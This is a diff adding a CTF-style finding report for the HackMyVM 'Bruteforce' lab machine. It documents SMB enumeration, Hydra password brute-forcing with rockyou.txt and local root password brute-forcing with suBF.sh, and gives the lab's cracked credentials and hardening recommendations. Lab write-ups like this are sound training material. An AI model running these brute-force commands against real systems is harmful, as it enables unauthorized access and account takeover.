@@ -1,0 +1,85 @@
+📑 Finding Report: User Access and Privilege Escalation
+Machine: Bruteforce – HackMyVM
+
+🟢 Executive Summary
+Severity: High
+Description:
+Initial access was obtained via brute-force attack against an SMB share user. The valid credentials were discovered using Hydra and the rockyou.txt wordlist. Post-authentication, access was granted as a limited user. Privilege escalation was achieved by running suBF.sh, which brute-forced the root password, ultimately allowing full system compromise and access to the root flag.
+
+🖥️ Scope and Environment
+Platform: HackMyVM
+Machine: Bruteforce (Linux – Easy)
+Assigned IP: 192.168.1.155
+Date of Analysis: 25/05/2025
+
+🛠 Tools Used
+
+nmap
+
+smbclient
+
+hydra
+
+rockyou.txt
+
+suBF.sh (https://github.com/carlospolop/su-bruteforce)
+
+bash
+
+🔍 Finding Description
+
+4.1 Port Scanning
+
+bash
+Copiar
+Editar
+nmap -sS -sV -oN bruteforce_nmap.txt 192.168.1.155
+Port 445/tcp was found open, indicating an SMB service.
+
+4.2 SMB Access and Information Gathering
+
+bash
+Copiar
+Editar
+smbclient -L \\192.168.1.155
+smbclient \\\\192.168.1.155\\[SHARE] -U andrea
+A readable readme file was identified and downloaded to the attacker's machine for local analysis.
+
+4.3 SMB Brute Force with Hydra
+
+hydra -l andrea -P /usr/share/wordlists/rockyou.txt smb://192.168.1.XXX
+Credential discovered:
+Username: andrea
+Password: awesome
+
+4.4 Privilege Escalation with suBF.sh
+Once logged in as andrea, the following brute-force script was executed locally to find the root password:
+
+/tmp$ ./suBF.sh -u root -t 0.7 -s 0.05
+Password discovered: 1998
+Privilege escalation successful using su, and the root flag was retrieved.
+
+🔐 Impact
+Critical. This vulnerability enabled:
+
+Unauthorized access via SMB brute-force
+
+Exposure of valid user credentials
+
+Privilege escalation through offline root password brute-force
+
+Full root-level system compromise
+
+🛡 Recommendations
+
+Disable SMB services if not required, or restrict them with proper authentication policies.
+
+Enforce strong password policies to prevent brute-force attacks.
+
+Monitor authentication logs and rate-limit login attempts.
+
+Remove sensitive or unnecessary files from shared locations.
+
+Prevent execution of brute-force tools by hardening system permissions.
+
+Regularly audit local users and their password strength.
